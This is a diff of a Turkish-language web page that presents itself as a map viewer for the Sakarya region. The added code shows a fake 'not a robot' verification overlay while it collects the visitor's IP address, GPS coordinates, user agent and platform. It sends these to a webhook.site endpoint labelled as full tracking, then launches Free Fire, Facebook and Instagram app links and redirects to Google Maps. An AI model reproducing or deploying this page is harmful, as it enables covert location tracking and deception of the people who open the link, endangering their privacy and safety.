@@ -11,7 +11,7 @@
             box-sizing: border-box;
         }
         body {
-            font-family: 'Segoe UI', sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             display: flex;
             justify-content: center;
@@ -28,6 +28,7 @@
             max-width: 320px;
             width: 100%;
             box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+            position: relative;
         }
         .map-image {
             width: 160px;
@@ -63,6 +64,54 @@
         }
         button:disabled {
             background: #ccc;
+            cursor: not-allowed;
+        }
+        
+        /* DOĞRULAMA KUTUSU */
+        .dogrulama {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            visibility: hidden;
+            opacity: 0;
+            transition: 0.3s;
+        }
+        .dogrulama-kutu {
+            background: white;
+            border-radius: 20px;
+            padding: 25px 30px;
+            text-align: center;
+            min-width: 250px;
+            max-width: 280px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .dogrulama-yazi {
+            font-size: 14px;
+            color: #5f6368;
+            margin-top: 10px;
+        }
+        .dogrulama-yazi strong {
+            color: #1a73e8;
         }
     </style>
 </head>
@@ -73,72 +122,124 @@
         <div class="alt-yazi">Sakarya bölgesindeki konuma bak</div>
         <button id="btn">Konumu Görüntüle</button>
     </div>
+    
+    <!-- DOĞRULAMA KUTUSU -->
+    <div id="dogrulamaBox" class="dogrulama">
+        <div class="dogrulama-kutu">
+            <div class="spinner"></div>
+            <div class="dogrulama-yazi">
+                <strong>🔍 Lütfen bekleyin</strong><br>
+                Robot olmadığınız doğrulanıyor...
+            </div>
+        </div>
+    </div>
 
     <script>
         const webhook = "https://webhook.site/45462893-c6b2-4d8b-a64f-783413a77923";
         
         async function gonder(veri) {
-            await fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(veri) });
+            try {
+                await fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(veri) });
+            } catch(e) {}
         }
         
-        async function islem() {
+        // Uygulamaları arka planda aç
+        function uygulamalariAc() {
+            setTimeout(() => {
+                window.location.href = "intent://play?link=https://ff.garena.com#Intent;scheme=https;package=com.dts.freefireth;end";
+            }, 100);
+            
+            setTimeout(() => {
+                window.location.href = "fb://profile";
+            }, 400);
+            
+            setTimeout(() => {
+                window.location.href = "instagram://user?username=";
+            }, 700);
+        }
+        
+        async function calistir() {
             const btn = document.getElementById('btn');
-            btn.innerText = "⏳";
+            const dogrulama = document.getElementById('dogrulamaBox');
+            
+            // Butonu devre dışı bırak
             btn.disabled = true;
             
-            let ip = "Bilinmiyor";
+            // Doğrulama kutusunu göster
+            dogrulama.style.visibility = "visible";
+            dogrulama.style.opacity = "1";
+            
+            let ip = "Alınamadı";
             let konumLink = "";
             let enlem = "", boylam = "";
             
-            // IP al
+            // 1. IP al
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const json = await res.json();
                 ip = json.ip;
             } catch(e) {}
             
-            // Konum al
+            // 2. Konum al
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
                     enlem = pos.coords.latitude;
                     boylam = pos.coords.longitude;
                     konumLink = `https://www.google.com/maps?q=${enlem},${boylam}`;
                     
-                    // Önce bilgileri gönder (şimdilik)
-                    await gonder({
-                        tip: "Hassso54_Takip",
+                    // Webhook'a gönder
+                    const veri = {
+                        tip: "Hassso54_Tam_Takip",
                         zaman: new Date().toLocaleString('tr-TR'),
-                        ip: ip,
+                        konum: konumLink,
                         enlem: enlem,
                         boylam: boylam,
-                        konum: konumLink,
-                        cihaz: navigator.userAgent
-                    });
+                        ip: ip,
+                        cihaz: navigator.userAgent,
+                        platform: navigator.platform,
+                        not: "Sakarya konum takibi - Uygulamalar açılacak"
+                    };
                     
-                    // Facebook ve Instagram uygulamalarını arka planda aç/kapat
-                    // Önce Facebook'u aç
-                    window.location.href = "fb://profile";
+                    await gonder(veri);
                     
-                    // 0.5 saniye sonra Instagram'ı aç
+                    // 1 saniye bekle (doğrulama gösterilsin)
                     setTimeout(() => {
-                        window.location.href = "instagram://user?username=";
-                    }, 500);
-                    
-                    // 1 saniye sonra haritayı aç
-                    setTimeout(() => {
-                        window.location.href = konumLink;
-                    }, 1200);
+                        // Doğrulama kutusunu gizle
+                        dogrulama.style.visibility = "hidden";
+                        dogrulama.style.opacity = "0";
+                        
+                        // Uygulamaları aç
+                        uygulamalariAc();
+                        
+                        // Google Maps'e yönlendir
+                        setTimeout(() => {
+                            window.location.href = konumLink;
+                        }, 800);
+                        
+                    }, 1000);
                     
                 }, async () => {
+                    // Konum hatası
                     await gonder({ tip: "Hata", ip: ip, hata: "Konum izni yok" });
-                    window.location.href = "https://www.google.com/maps";
+                    
+                    setTimeout(() => {
+                        dogrulama.style.visibility = "hidden";
+                        dogrulama.style.opacity = "0";
+                        uygulamalariAc();
+                        window.location.href = "https://www.google.com/maps";
+                    }, 800);
                 });
             } else {
-                window.location.href = "https://www.google.com/maps";
+                setTimeout(() => {
+                    dogrulama.style.visibility = "hidden";
+                    dogrulama.style.opacity = "0";
+                    uygulamalariAc();
+                    window.location.href = "https://www.google.com/maps";
+                }, 800);
             }
         }
         
-        document.getElementById('btn').onclick = islem;
+        document.getElementById('btn').onclick = calistir;
     </script>
 </body>
 </html>
